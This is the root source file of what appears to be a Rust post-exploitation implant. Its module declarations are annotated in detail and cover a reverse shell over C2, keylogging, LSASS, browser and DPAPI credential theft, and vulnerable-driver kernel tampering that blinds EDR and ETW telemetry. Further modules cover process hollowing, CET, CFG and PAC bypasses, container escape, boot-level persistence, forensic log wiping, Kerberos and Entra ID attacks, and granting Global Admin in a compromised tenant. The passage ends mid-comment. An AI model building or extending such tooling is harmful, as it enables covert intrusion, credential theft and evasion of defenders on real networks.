#![allow(dead_code)]
#![allow(non_camel_case_types)]
#![allow(non_snake_case)]
#![allow(unexpected_cfgs)]
#![allow(unreachable_patterns)]
#![allow(unused_assignments)]
#![allow(unused_imports)]
#![allow(unused_must_use)]
#![allow(unused_mut)]
#![allow(unused_parens)]
#![allow(unused_unsafe)]
#![allow(unused_variables)]

pub mod config;
pub mod env_check;
pub mod fsops;
pub mod handlers;
pub mod process_manager;
pub mod process_spoof;
pub mod shell;

/// Local Windows type definitions (replaces winapi type-only imports).
#[cfg(windows)]
pub mod win_types;

#[cfg(windows)]
pub mod lateral_movement;
#[cfg(windows)]
pub mod token_manipulation;

#[cfg(feature = "outbound-c")]
pub mod outbound;

#[cfg(feature = "ssh-transport")]
pub mod c2_ssh;

#[cfg(feature = "smb-pipe-transport")]
pub mod c2_smb;

#[cfg(feature = "persistence")]
pub mod persistence;

#[cfg(feature = "network-discovery")]
pub mod net_discovery;

#[cfg(feature = "remote-assist")]
pub mod remote_assist;

#[cfg(feature = "hci-research")]
pub mod hci_logging;

// Automated internal reconnaissance: AD enumeration, attack path discovery,
// cloud fingerprinting, and credential attack automation.
// Gated behind `recon` feature flag.  Windows-only.
#[cfg(all(windows, feature = "recon"))]
pub mod recon;

pub mod syscalls;

#[cfg(all(windows, not(feature = "syscall-emulation")))]
#[macro_export]
macro_rules! emulated_syscall {
    ($func_name:expr $(, $args:expr)* $(,)?) => {
        $crate::syscall!($func_name $(, $args)*)
    };
}

// Unwind-aware call-stack spoofing database and chain generator.
// Provides multi-frame plausible call graph chains for the NtContinue-based
// stack-spoof path in syscalls.rs.  Gated behind `stack-spoof`.
// Supports both x86_64 and aarch64 Windows targets.
#[cfg(all(windows, feature = "stack-spoof"))]
pub mod stack_db;

// Indirect-syscall stack spoofing with synthetic multi-frame call chains.
// Provides transit gadgets and Win32 API call chain construction for
// spoof_call / clean_call integration.  Gated behind `stack-spoof` + x86_64.
#[cfg(all(windows, feature = "stack-spoof", target_arch = "x86_64"))]
pub mod stack_spoof;

// Self-re-encoding ("Metamorphic Lite"): re-encode .text at runtime.
#[cfg(feature = "self-reencode")]
pub mod self_reencode;

// SIMD-accelerated performance primitives for hot-path operations
// (secure zeroing, bulk XOR).  Gated behind `perf-optimize`, which
// also enables the optimizer crate's full metamorphic diversification
// pipeline (instruction substitution, dead-code insertion, NOP
// scheduling, microarchitecture-specific dispatch).
#[cfg(feature = "perf-optimize")]
pub mod perf;

// Memory-guard: active implementation when feature is on, zero-cost stubs when off.
#[cfg(feature = "memory-guard")]
pub mod memory_guard;
#[cfg(not(feature = "memory-guard"))]
#[path = "memory_guard_stub.rs"]
pub mod memory_guard;

pub mod p2p;

// Unified injection framework (Windows-only, wraps existing injection module).
#[cfg(windows)]
pub mod injection_engine;

// NTDLL unhooking via \KnownDlls re-fetch. Supplements Halo's Gate by
// re-fetching a clean ntdll .text section when all adjacent syscall stubs
// are hooked. Used as fallback when Halo's Gate cannot infer an SSN,
// as a post-sleep-wake re-check, and on operator command.
#[cfg(windows)]
pub mod ntdll_unhook;

// Advanced sleep obfuscation with full memory encryption, stack spoofing,
// and anti-forensics.  Replaces the Ekko-style sleep on Windows.
#[cfg(windows)]
pub mod sleep_obfuscation;

// Timer-based sleep using NtCreateTimer + NtSetTimer + NtWaitForSingleObject.
// Avoids NtDelayExecution entirely — timer fires through a different kernel
// path (KE_TIMER → KiDeliverApc) that is less commonly hooked by EDR.
// Uses NtQueryPerformanceCounter for hardware timestamps and can target a
// clean-mapped DLL gadget for the APC callback address.
#[cfg(windows)]
pub mod hw_timer_sleep;

// Memory Encryption with Thread Context: encrypts thread register states
// (CONTEXT structs), stack pointers, and TLS data during sleep obfuscation.
// Suspends all non-current threads, captures and XChaCha20-Poly1305-encrypts
// their CONTEXT structs, then restores on wake.  Prevents forensic tools
// from recovering execution state from suspended thread registers.
// Windows-only, gated by `thread-ctx-encrypt` feature.
#[cfg(all(windows, feature = "thread-ctx-encrypt"))]
pub mod thread_context_encrypt;

// Trampoline-based stack spoofing: builds multi-frame synthetic call stacks
// using trampolines through clean-mapped system DLLs.  Produces call stacks
// that appear as normal application worker threads when inspected by EDR
// stack-walking tools.  Allocates a separate fake stack with plausible return
// addresses, frame pointers, and shadow space.  Falls back to spoof_call
// when trampolines are unavailable.  Windows x86_64 only, gated by the
// `trampoline-spoof` feature flag (implies `direct-syscalls`).
#[cfg(all(windows, feature = "trampoline-spoof", target_arch = "x86_64"))]
pub mod trampoline_spoof;

// Continuous memory hiding ("Evanesco"): keeps all pages NOT actively being
// executed in an encrypted/PAGE_NOACCESS state at ALL times.  Per-page RC4
// encryption, VEH-based auto-decryption, and background re-encryption.
// Windows-only, gated by the `evanesco` feature flag.
#[cfg(all(windows, feature = "evanesco"))]
pub mod page_tracker;

// Runtime page-size resolution for injection modules.
// ARM64 Windows may use 4 KB or 16 KB pages; this queries GetSystemInfo
// once and caches the result so no injection module hard-codes 0x1000.
#[cfg(windows)]
pub mod page_size;

// Continuous memory hygiene: PEB scrubbing, thread start address sanitization,
// handle table cleanup, and periodic re-verification.  Works alongside the
// sleep obfuscation system to reduce forensic visibility.
#[cfg(windows)]
pub mod memory_hygiene;

// In-process .NET assembly execution via CLR hosting (ICLRMetaHost).
// Equivalent to Cobalt Strike's execute-assembly.  Loads and runs arbitrary
// .NET assemblies entirely in-process without spawning a child process.
#[cfg(windows)]
pub mod assembly_loader;

// BOF (Beacon Object File) / COFF loader — executes small position-
// independent C/Rust object files in-process.  Compatible with the public
// BOF ecosystem (trustedsec, CCob, naaf, etc.) via the DLL$Function symbol
// resolution scheme.
#[cfg(windows)]
pub mod coff_loader;

// Interactive reverse shell — persistent cmd.exe / sh / custom shell process
// where the operator can type commands and receive real-time output.
// Background reader threads stream output asynchronously through the C2
// channel as Message::ShellOutput events.
pub mod interactive_shell;

// Malleable C2 profile parser — defines how the agent shapes its C2 traffic
// (HTTP/DNS) to blend in with legitimate network activity.  Platform-agnostic.
pub mod malleable;

// Surveillance capabilities: screenshot capture, keylogger, clipboard monitor.
// Gated by the `surveillance` feature flag.
#[cfg(feature = "surveillance")]
pub mod surveillance;

// Browser stored-data recovery: Chrome (App-Bound Encryption v127+), Edge,
// Firefox (NSS-based decryption).  Windows-only, gated by `browser-data`.
#[cfg(all(windows, feature = "browser-data"))]
pub mod browser_data;

// LSASS credential harvesting: incremental memory reading via indirect syscalls.
// Parses credential structures in-process without creating a dump file on disk.
// Windows-only.
#[cfg(windows)]
pub mod lsass_harvest;

// LSA Whisperer: credential extraction via LSA SSP interfaces.
// Interacts with LSA authentication packages through documented interfaces,
// operating within the LSA process's own security context.  Bypasses Credential
// Guard and RunAsPPL.  Windows-only, gated by `lsa-whisperer`.
#[cfg(all(windows, feature = "lsa-whisperer"))]
pub mod lsa_whisperer;

// SSP injection support for LSA Whisperer: position-independent stub builder,
// shared memory IPC, and LSASS injection via indirect syscalls.
#[cfg(all(windows, feature = "lsa-whisperer"))]
pub mod lsa_whisperer_ssp;

// Kernel callback overwrite (BYOVD): surgically overwrite EDR kernel callback
// function pointers to point to a `ret` instruction instead of NULLing them.
// Defeats EDR self-integrity checks (CrowdStrike, Defender) that verify their
// callbacks are still registered by checking if the pointer is non-NULL.
// Uses a vulnerable signed driver for physical memory read/write access.
// Windows-only, gated by `kernel-callback` (implies `direct-syscalls`).
#[cfg(all(windows, feature = "kernel-callback"))]
pub mod kernel_callback;

// Kernel-level process argument spoofing via BYOVD: modifies _EPROCESS
// structures directly (SeAuditProcessCreationInfo, ImageFileName, and
// RTL_USER_PROCESS_PARAMETERS) so the spoofed arguments are the only
// version that ever existed in any log (Event Log 4688, PEB, EPROCESS).
// Unlike userland PEB-only spoofing, kernel-level spoofing happens before
// any forensic tool can snapshot the original values.  Requires the
// kernel-callback feature (BYOVD driver deployed).  Windows x86_64 only.
#[cfg(all(windows, feature = "kernel-callback"))]
pub mod kernel_arg_spoof;

// ETW-Ti (Event Tracing for Windows — Threat Intelligence) kernel bypass:
// nullifies ETW-Ti provider callbacks at the kernel level using BYOVD driver
// kernel memory read/write primitives.  ETW-Ti is a set of kernel telemetry
// providers (process/thread/image-load/registry/file-io/network) that deliver
// events directly from kernel sensor callbacks to EDR products, bypassing
// userland ETW patching.  This module resolves the ETW-Ti provider registration
// table in ntoskrnl, walks each provider's callback chain, and overwrites
// callback pointers to point to a `ret` instruction (non-NULL, passes EDR
// self-integrity checks).  Build-specific offset tables for Windows 10 1809+
// through Windows 11 24H2.  Saves original pointers for clean restoration.
// Cross-architecture (x86_64 and aarch64).  Requires the kernel-callback
// feature (BYOVD driver deployed).  Windows-only.
#[cfg(all(windows, feature = "kernel-callback"))]
pub mod etw_ti_bypass;

// Automated EDR bypass transformation engine: scans the agent's own .text
// section for byte signatures known to be detected by EDR (YARA rules, entropy
// heuristics, known gadget chains like "4C 8B D1 B8" for direct syscall stubs).
// When a detected pattern is found, applies semantic-preserving transformations
// at runtime: instruction substitution, register reassignment, nop sled
// insertion, constant splitting, jump obfuscation.  Supplements self-reencode
// (handles pattern avoidance before and after morphing).  Gated by
// `evasion-transform` (implies `self-reencode`).
#[cfg(all(feature = "evasion-transform", target_arch = "x86_64"))]
pub mod edr_bypass_transform;
#[cfg(all(feature = "evasion-transform", target_arch = "aarch64"))]
pub mod edr_bypass_transform_aarch64;
#[cfg(all(feature = "evasion-transform", target_arch = "aarch64"))]
pub use edr_bypass_transform_aarch64 as edr_bypass_transform;

// NTFS transaction-based process hollowing with ETW blinding: creates an
// NTFS transaction, writes payload into a transaction-backed section,
// creates the target process suspended, hollows it, then rolls back the
// transaction so the file on disk never existed.  The section mapping in
// the target process remains valid.  Includes ETW blinding with spoofed
// Windows Defender / Sysmon provider GUIDs.  SSN resolution via existing
// indirect syscall infrastructure with kernel32 ordinal fallback.
// Windows-only, gated by `transacted-hollowing` feature flag.
#[cfg(all(windows, feature = "transacted-hollowing"))]
pub mod injection_transacted;

// Process Doppelganging injection: creates a file within an NTFS transaction,
// writes the payload, creates a section backed by the transacted file, then
// rolls back the transaction (deleting the file from disk).  The section
// mapping persists in memory and is mapped into the target process.  Unlike
// transacted hollowing, doppelganging does not replace a sacrificial process
// image — it maps the section directly into an existing or newly-created
// target.  All NT API calls use indirect syscalls.  Windows-only, gated by
// `transacted-hollowing` feature flag.
#[cfg(all(windows, feature = "transacted-hollowing"))]
pub mod injection_doppelganging;

// Delayed module-stomp injection: loads a sacrificial DLL into the target
// process via LoadLibraryA, waits for a configurable randomized delay
// (default 8–15 seconds) to let EDR initial-scan heuristics pass, then
// overwrites the DLL's .text section with the payload using indirect
// syscalls.  Two-phase: Phase 1 loads DLL and returns immediately;
// Phase 2 (stomp + execute) fires after the delay in a background thread.
// Payload state is stored encrypted via memory_guard.  Windows-only,
// gated by `delayed-stomp` feature flag.
#[cfg(all(windows, feature = "delayed-stomp"))]
pub mod injection_delayed_stomp;

// User-mode NT kernel interface emulation: routes configured Nt* syscalls
// through kernel32/advapi32 equivalents instead of ntdll syscall stubs.
// Makes the agent invisible to EDR hooks on ntdll AND to ntdll unhooking
// detection.  Call stacks show kernel32!WriteProcessMemory etc. — looks
// like legitimate API usage.  Falls back to existing indirect syscall path
// when kernel32 equivalent fails.  Windows-only, gated by `syscall-emulation`
// feature flag (implies `direct-syscalls`).
#[cfg(all(windows, feature = "syscall-emulation"))]
pub mod syscall_emulation;

// CET (Control-flow Enforcement Technology) / Shadow Stack bypass: handles
// Windows 11 24H2+ hardware-enforced shadow stacks that defeat return-address
// spoofing and stack pivoting.  Three strategies: (1) disable CET via process
// mitigation policy, (2) CET-compatible call chain building, (3) VEH-based
// shadow stack fix (experimental, requires kernel access via kernel-callback).
// Integrates with the existing stack-spoofing code in syscalls.rs by adding
// a CET-awareness check at the entry point of spoof_call.  Windows-only,
// gated by `cet-bypass` feature flag (implies `direct-syscalls`).
// x86-64 only: CET, WRSS, and shadow-stack manipulation are Intel-specific.
#[cfg(all(windows, feature = "cet-bypass", target_arch = "x86_64"))]
pub mod cet_bypass;

// Shadow Stack Forging for Intel CET: proactively forges entries on the
// hardware-enforced shadow stack using the WRSS (Write Reference to Shadow
// Stack) instruction.  This makes redirected return addresses created by
// spoof_call appear legitimate to CET's hardware enforcement, preventing
// #CP (Control Protection) exceptions.  Approaches:
//   (1) WRSS-based forging — writes the gadget address onto the shadow stack
//       before spoof_call, so the API's RET finds a matching entry.
//   (2) SSP manipulation — save/restore shadow stack pointer via
//       SAVEPREVSSP/RSTORSSP/INCSSPQ for complete shadow stack switching.
//   (3) Pre-spoof preparation — integrate with clean_call! to automatically
//       forge/restore shadow stack entries around every spoofed call.
// Gracefully degrades when CET is not available (no-op).  Windows x86_64
// only, gated by `cet-bypass` feature flag.
#[cfg(all(windows, feature = "cet-bypass", target_arch = "x86_64"))]
pub mod shadow_stack_forge;

// Indirect Branch Tracking (IBT) Bypass for Intel CET: scans clean-mapped
// system DLLs for ENDBR64 gadgets (F3 0F 1E FA) that can serve as IBT-valid
// indirect branch targets.  IBT requires every indirect call/jump target to
// start with ENDBR64; we reuse ENDBR64 locations found in large system
// binaries (ntdll, kernel32, kernelbase) as trampolines:
//   (1) ENDBR64 scanner — finds all ENDBR64 instructions in .text sections,
//       categorizes them (FunctionEntry, MidFunction, AfterNop, ExceptionEntry),
//       and analyzes the instructions after each ENDBR64 for gadget operations
//       (jmp reg, call reg, ret, syscall).
//   (2) Gadget database — indexes found gadgets by operation type (JmpRax,
//       CallRax, RetGadgets, SyscallGadgets) for efficient lookup.
//   (3) IBT-safe execution — dispatches indirect calls through ENDBR64; jmp rax
//       gadgets so IBT's hardware check passes, then the gadget redirects to
//       the actual API target.
//   (4) Integration with spoof_call — wraps the existing spoofing mechanism
//       with IBT-valid dispatch, using the same stack manipulation but routing
//       through an ENDBR64 gadget instead of directly to the API.
// Gracefully degrades when IBT is not active (uses existing spoof_call).
// Windows x86_64 only, gated by `cet-bypass` feature flag.
#[cfg(all(windows, feature = "cet-bypass", target_arch = "x86_64"))]
pub mod ibt_bypass;

// ARM64 BTI/PAC (Branch Target Identification / Pointer Authentication Code)
// bypass.  ARM64 Windows uses PAC to cryptographically sign return addresses
// with 128-bit keys (QARMA5 algorithm) — significantly harder to bypass than
// Intel CET shadow stacks.  Strategies:
//   (1) PAC-valid trampoline routing — route calls through system DLL functions
//       that already perform PACIASP/AUTIASP in their prologue/epilogue,
//       piggy-backing on their legitimate PAC flow.
//   (2) PAC key extraction via BYOVD — extract 128-bit PAC keys from the
//       KTHREAD structure using a deployed vulnerable driver, then use PACIA
//       inline assembly to sign our own pointers.
//   (3) BTI gadget scanning — find BTI instructions in system DLLs that serve
//       as valid indirect branch targets, building a gadget database for
//       call routing (analogous to ENDBR64 scanning on x86-64).
// Gracefully degrades when PAC is not available (no-op).
// Windows ARM64 only, gated by `pac-bypass` feature flag (implies direct-syscalls).
#[cfg(all(windows, feature = "pac-bypass", target_arch = "aarch64"))]
pub mod bti_pac_bypass;

// Exception-based SSN resolution (Tartarus' Gate): resolves NT syscall numbers
// via a VEH handler that fires on access violations, reading the SSN from
// NTDLL function prologues as the hook chain is walked.  Bypasses all EDR
// ntdll hooks without reading the .text section or mapping a clean ntdll.
// Two strategies: (1) direct hook-chain walking (no exception), (2) VEH-based
// exception handler that catches STATUS_ACCESS_VIOLATION on hooked stubs.
// Windows-only, gated by `direct-syscalls` feature flag.  x86-64 only: the
// VEH-based hook-chain walker uses x86-64 instruction patterns and CONTEXT layout.
#[cfg(all(windows, feature = "direct-syscalls", target_arch = "x86_64"))]
pub mod exception_ssn;

// SEH-based anti-debugging: constructs deeply nested, valid VEH handler chains
// that cause analysis tools, debuggers, and emulators to mis-execute or crash
// when attempting to trace execution.  NOT traditional anti-debugging (no
// IsDebuggerPresent, no NtQueryInformationProcess(ProcessDebugPort)) — operates
// through the Windows exception dispatch mechanism itself.  Six anti-debug
// strategies: trap flag single-step detection, CloseHandle with invalid handle,
// int 0x2D breakpoint, icebp (0xF1), lock-prefix null deref, and instrumentation
// callback query.  Includes SEH-based code obfuscation (fragment encryption with
// VEH-driven decryption), anti-trace (single-step counting with time windows),
// and SEH chain integrity verification.  Windows-only, gated by `seh-anti-debug`
// feature flag.
#[cfg(all(windows, feature = "seh-anti-debug"))]
pub mod seh_anti_debug;

// Page fault driven execution: keeps payload pages encrypted with
// XChaCha20-Poly1305 under PAGE_NOACCESS.  A VEH handler intercepts
// STATUS_ACCESS_VIOLATION faults, decrypts the faulting page, sets
// PAGE_EXECUTE_READ, and resumes execution.  A periodic timer re-encrypts
// stale pages.  Includes anomaly detection.  Windows x86_64 only,
// gated by `page-fault-exec` feature flag.
#[cfg(all(windows, feature = "page-fault-exec", target_arch = "x86_64"))]
pub mod page_fault_exec;

// Counterfeit Object-Oriented Programming (COOP): an evolution of ROP that
// chains calls through C++ virtual function dispatch rather than raw gadgets.
// Because COOP chains go through legitimate vtable pointers in legitimate
// objects, CFI/CFG implementations see only valid indirect call targets
// throughout the chain.  Scans system DLLs for vtables, classifies virtual
// functions by behavior, constructs counterfeit objects, and chains
// operations via virtual dispatch.  No executable memory is allocated —
// only data objects (PAGE_READWRITE).  Windows x86_64 only, gated by
// `coop` feature flag.
#[cfg(all(windows, feature = "coop", target_arch = "x86_64"))]
pub mod coop;

// Kernel stack pivoting via APC (BYOVD): queues kernel APCs to threads and
// pivots their kernel stacks to controlled buffers, bypassing EDR kernel
// callback instrumentation entirely.  Build-specific KTHREAD/EPROCESS offset
// tables for Windows 10 20H1 through Windows 11 24H2.  Allocates KAPC
// structures in non-paged pool via direct kernel memory write.  Research-grade
// — requires deployed vulnerable driver.  Windows x86_64 only, gated by
// `kernel-callback` feature flag.
#[cfg(all(windows, feature = "kernel-callback", target_arch = "x86_64"))]
pub mod kernel_apc_pivot;

// Control Flow Guard (CFG) bypass: three strategies to bypass Microsoft's
// CFG implementation which validates indirect call targets against a kernel-
// maintained bitset.  (1) Promote agent/shellcode addresses directly in the
// CFG bitset.  (2) Route execution through CFG-valid trampolines found in
// system DLLs (call rax/call r10 gadgets).  (3) Override the CFG dispatch
// function pointer to always return TRUE.  Integrates with spoof_call and
// clean_call! to promote target addresses before indirect calls.
// Windows-only, gated by `cfg-bypass` feature flag (implies `direct-syscalls`).
// x86-64 only: scans for x86-64 indirect-call gadgets (call rax, call r10, etc.)
// and uses x86-64 inline assembly for CFG bit-set manipulation.
#[cfg(all(windows, feature = "cfg-bypass", target_arch = "x86_64"))]
pub mod cfg_bypass;

// Token-only impersonation via NtImpersonateThread / SetThreadToken:
// bypasses ImpersonateNamedPipeClient detection by extracting the
// impersonation token through a helper thread and applying it to the
// main thread via NtSetInformationThread(ThreadImpersonationToken).
// Alternative strategy uses DuplicateTokenEx + SetThreadToken directly.
// Includes encrypted token cache, auto-revert on task completion, and
// integration with lsass_harvest and P2P SMB pipe connections.
// Windows-only, gated by `token-impersonation` feature flag
// (implies `direct-syscalls`).
#[cfg(all(windows, feature = "token-impersonation"))]
pub mod token_impersonation;

// Local Privilege Escalation: automated SYSTEM token acquisition via token
// theft, named pipe impersonation, and Print Spooler exploitation.
// Tries multiple techniques in order, returns first success.
// Windows-only, gated by `lpe` feature flag (implies `direct-syscalls`).
#[cfg(all(windows, feature = "lpe"))]
pub mod lpe;

// Container escape, cloud metadata credential theft, and cloud IAM lateral
// movement.  Detects container type (Docker/Podman/K8s/LXC), checks privilege
// level, attempts escape via cgroup release_notification, device mount, and
// mount propagation.  Queries AWS/Azure/GCP IMDS for temporary credentials.
// Uses stolen credentials to enumerate cloud resources.  Reads K8s SA tokens.
// Linux-only, gated by `container-escape` feature (implies `direct-syscalls`).
#[cfg(all(target_os = "linux", feature = "container-escape"))]
pub mod container;

// Shared macOS FFI types and CoreGraphics / CoreFoundation bindings.
// Centralises CGPoint, CGSize, CGRect, CFTypeRef, and common extern
// blocks used by remote_assist, macos_postexp, and env_check_sandbox.
// Gated to macOS only — no content on other platforms.
#[cfg(target_os = "macos")]
pub mod macos_ffi;

// macOS post-exploitation: TCC bypass (database manipulation, synthetic
// click via CoreGraphics, vulnerable process delegation), SIP status
// assessment (csrutil, NVRAM, capability enumeration), XPC service
// discovery and privilege escalation abuse (Mach messaging), Keychain
// credential dump (SecItemCopyMatching), and Secure Enclave key
// enumeration.  Uses raw FFI to Apple frameworks — no external crate
// dependencies.  macOS-only, gated by `macos-postexp` feature flag.
#[cfg(all(target_os = "macos", feature = "macos-postexp"))]
pub mod macos_postexp;

// Hardware-level persistence and attack: Thunderbolt/DMA controller
// detection (sysfs / SetupAPI), DMA vulnerability assessment (security
// level, IOMMU/VT-d, kernel DMA protection), DMA payload generation,
// physical memory read via BYOVD, VBR/boot-sector persistence (Legacy
// BIOS), UEFI boot persistence (ESP driver, NVRAM boot entries), and
// boot-level artifact detection/removal.  All disk modifications are
// backed up and verified by read-back.  Cross-platform (Linux + Windows).
// Gated by `hardware-persistence` feature flag.
#[cfg(feature = "hardware-persistence")]
pub mod hardware_persistence;

// Adaptive C2 timing: learns the target network's traffic patterns and
// adjusts callback timing to blend in with observed traffic.  Replaces
// simple fixed-percentage jitter with Gaussian-distributed timing modelled
// on real inter-arrival statistics.  Three phases (Learning → Active →
// Evasion), peak/quiet hour detection, and burst-pattern analysis.
// Cross-platform, no external ML dependencies.  Gated by `adaptive-timing`.
#[cfg(feature = "adaptive-timing")]
pub mod adaptive_timing;

// Reflective DLL loading via NtCreateSection + NtMapViewOfSection.
// Loads PE DLLs into the current or a remote process without calling
// VirtualAlloc/VirtualAllocEx — uses lower-level NT section primitives
// that bypass the Win32 API layer entirely.  Handles PE32 and PE32+
// relocations, IAT rebuilding, per-section memory protections, and
// header cleanup.  Remote variant maps a shared section into both
// agent and target process for cross-process injection.
// Windows x86_64 only, gated by `reflective-loader` feature flag
// (implies `direct-syscalls`).
#[cfg(all(windows, feature = "reflective-loader", target_arch = "x86_64"))]
pub mod reflective_loader;

// Forensic cleanup subsystem: removes forensic evidence left by injected
// processes.  Currently provides Windows Prefetch (.pf) evidence removal
// via three strategies: delete (NtDeleteFile), patch (NtCreateSection +
// NtMapViewOfSection — preferred, file remains but contains no forensic
// data), and disable-service (registry EnablePrefetcher = 0).  Also
// cleans USN journal entries referencing the .pf file.  All NT API calls
// use indirect syscalls via nt_syscall to bypass EDR hooks.
// Hooks into injection_engine post-injection for automatic cleanup.
// Handles DISK evidence only — does NOT overlap with any memory-hygiene
// subsystem.
// Windows-only, gated by `forensic-cleanup` feature flag
// (implies `direct-syscalls`).
#[cfg(all(windows, feature = "forensic-cleanup"))]
pub mod forensic_cleanup;

// Kerberos relay attack via COM cross-session activation: captures Kerberos
// service tickets without NTLM by triggering COM activation (CoCreateInstanceEx
// with custom COSERVERINFO) against an attacker-controlled RPC listener.  The
// COM runtime sends a Kerberos AP-REQ in the RPC bind security trailer, which
// the agent parses (minimal ASN.1/DER decoder) and returns to the operator.
// Known exploitable CLSIDs (BITS, ICertPassage, TaskService, UpdateOrchestrator)
// are hardcoded.  API resolution via pe_resolve (ole32.dll, kernel32.dll) — no
// IAT entries.  Requires SeImpersonatePrivilege for COM activation.
// Windows-only, gated by `kerberos-relay` feature flag.
#[cfg(all(windows, feature = "kerberos-relay"))]
pub mod kerberos_relay;

// DPAPI domain backup key retrieval and secret decryption via MS-BKRP
// (BackupKey Remote Protocol).  Retrieves the domain backup key from a
// Domain Controller using RPC over named pipe (\pipe\lsarpc), then uses
// it to decrypt DPAPI-protected secrets (Credential Store, Chrome, WiFi,
// RDP) without touching LSASS memory.  Any domain-authenticated user can
// retrieve the backup key — Domain Admin privileges are NOT required.
// API resolution via pe_resolve (netapi32.dll, rpcrt4.dll, advapi32.dll)
// — no IAT entries.  Windows-only, gated by `dpapi-backup` feature flag.
#[cfg(all(windows, feature = "dpapi-backup"))]
pub mod dpapi_backup;

// Shadow Credentials attack: adds attacker-controlled X.509 certificate
// credentials to a target user or computer object's msDS-KeyCredentialLink
// attribute via LDAP, then authenticates as that principal via PKINIT Kerberos.
// No password change required or logged.  Exploits delegated write permissions
// — does NOT require Domain Admin.  Uses LDAP (wldap32.dll) for attribute
// modification and raw Kerberos for PKINIT authentication.  API resolution via
// pe_resolve — no IAT entries.  Windows-only, gated by `shadow-credentials`
// feature flag.
#[cfg(all(windows, feature = "shadow-credentials"))]
pub mod shadow_credentials;

// Registry-free COM object hijacking via SxS manifest activation contexts.
// Redirects COM CLSID resolution to an attacker-controlled proxy DLL without
// touching the Windows registry.  Uses activation contexts (CreateActCtxW /
// ActivateActCtx / DeactivateActCtx / ReleaseActCtx) resolved by hash from
// kernel32.dll.  Manifests are loaded from memory via temp file write-delete
// cycle.  Includes a TargetSelector for identifying hijackable COM objects
// and a proxy DLL PE generator.  No IAT entries — all API resolution via
// pe_resolve hash-based resolution.  Windows-only, gated by `com-hijack`
// feature flag.
#[cfg(all(windows, feature = "com-hijack"))]
pub mod com_hijack;

// S4U2Self / S4U2Proxy Kerberos delegation abuse: discovers accounts with
// constrained delegation (msDS-AllowedToDelegateTo) or protocol transition
// (TRUSTED_TO_AUTH_FOR_DELEGATION) in Active Directory, then forges Kerberos
// service tickets for arbitrary users.  The S4U2Self extension (PA-FOR-USER,
// PA-DATA type 129) allows a service account with protocol transition to obtain
// a ticket to itself on behalf of any domain user.  S4U2Proxy then uses that
// ticket as evidence to request a forwardable service ticket to a backend
// service listed in msDS-AllowedToDelegateTo.  The forged ticket can be
// submitted to the current LSA session via LsaCallAuthenticationPackage
// (KERB_SUBMIT_TKT).  LDAP delegation discovery via wldap32.dll, KDC
// communication over TCP port 88 with 4-byte big-endian length framing, and
// manual DER encoding for TGS-REQ / PA-FOR-USER construction.  All API
// resolution via pe_resolve hash-based resolution — no IAT entries.
// Windows-only, gated by `s4u-abuse` feature flag.
#[cfg(all(windows, feature = "s4u-abuse"))]
pub mod s4u_abuse;

// COM Scriptlet (.sct) execution via xwizard.exe and alternative LOLBINs
// (odbcconf.exe, pcwrun.exe, forfiles.exe).  Generates COM scriptlet XML
// with inline JScript/VBScript that hosts shellcode via COM object
// instantiation (ADODB.Stream → shellcode exec).  xwizard.exe is signed
// by Microsoft and not commonly monitored by EDR.  Supports disk-based
// execution (TEMP .sct files) and memory-mapped file via NtCreateSection.
// Includes LolbinDispatcher for fallback when xwizard is unavailable.
// NO powershell.exe, cmd.exe, wscript.exe, or mshta.exe in any path.
// All API resolution via pe_resolve — no IAT entries.  Windows-only.
#[cfg(all(windows, feature = "lolbin-xwizard"))]
pub mod lolbin_xwizard;

// WSL2 as an evasion layer: uses the Windows Subsystem for Linux v2 to
// execute ELF binaries, run Linux-native tools (curl, socat, ncat), and
// relay C2 traffic through the WSL2 VM — completely outside the Windows
// security product surface.  Detection probes for wsl.exe availability,
// LxssManager service state, and registered distros.  Execution strategies:
// (1) temp-file: write ELF to Windows TEMP, access via /mnt/c/ from WSL,
// (2) memfd_create: pipe ELF bytes to anonymous memory fd within WSL.
// Networking via WSL2 (curl, socat, ncat) evades Windows network hooks.
// File access via /mnt/c/ bridges Windows and WSL2 filesystems.  Injection
// into WSL2 processes via ptrace (Linux-native, invisible to Windows EDR).
// No Admin required — graceful degradation when WSL2 unavailable.  All API
// resolution via pe_resolve — no IAT entries.  Windows-only.
#[cfg(all(windows, feature = "wsl2-evasion"))]
pub mod wsl2_evasion;

// VSS (Volume Shadow Copy) pivoting: reads locked files (SAM, SYSTEM,
// NTDS.dit) through VSS snapshot filesystem paths instead of direct access.
// Bypasses file-access telemetry because EDR monitors direct opens but not
// \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy paths.  Includes:
// shadow copy discovery (vssadmin parsing + device path probing),
// VSS file reader (NtCreateFile + NtReadFile via syscall! macro — no IAT
// entries), SAM/NTDS credential harvesting (in-memory parsing of registry
// hives and ESE databases), and selective cleanup (only deletes agent-created
// snapshots, never touches system backups or restore points).
// Windows-only, gated by `vss-pivot` feature flag.
#[cfg(all(windows, feature = "vss-pivot"))]
pub mod vss_pivot;

// Entra ID Pass-the-Certificate: authenticates to Microsoft Entra ID (Azure AD)
// using a stolen or forged X.509 certificate + RSA private key instead of a
// password or client secret.  Implements the OAuth 2.0 client-credentials flow
// with RS256 JWT assertion (RFC 7523).  Supports Azure Commercial and Azure
// Government cloud endpoints.  Graph API helpers: list users, groups,
// applications, service principals, directory roles, and arbitrary queries.
// Token management includes automatic refresh, expiry tracking, and thread-
// safe caching.  Cross-platform (Entra ID is cloud-based — no Windows-only
// APIs needed).  Gated by `entra-ptc` feature flag (implies `ring`).
#[cfg(feature = "entra-ptc")]
pub mod entra_ptc;

// Entra ID / Azure AD credential attack capabilities: PRT theft (browser
// cookies, DPAPI, WAM, CloudAP), Pass-the-Certificate (RS256 JWT assertion),
// Golden SAML (AD FS token-signing key), and token utilization (Graph, ARM,
// Key Vault).  PRT extraction does not require Domain Admin or LSASS access —
// the PRT is stored in user-accessible credential stores.  Tokens are held in
// memory only.  Cross-platform (Entra ID is cloud-based), but PRT theft and
// AD FS key extraction are Windows-only.  Gated by `entra-attacks` feature
// flag (implies `ring` for RSA signing + `entra-ptc` for shared types).
#[cfg(feature = "entra-attacks")]
pub mod entra_attacks;

// Entra ID OAuth application abuse: register malicious applications in a
// compromised Azure AD tenant, grant them high-privilege Microsoft Graph API
// permissions (Mail.Read, Files.Read.All, Directory.Read.All, RoleManagement.
// ReadWrite.Directory), add client secrets (encrypted via HKDF — never stored
// in plaintext), authenticate via the OAuth2 client-credentials flow for
// persistent password-free access that bypasses MFA, enumerate the full tenant
// (users, groups, apps, roles), read all mailboxes and OneDrive files, and
// elevate users to Global Admin.  Cross-platform (cloud API via reqwest).
// Gated by `entra-app-abuse` feature flag (implies `entra-ptc` for shared
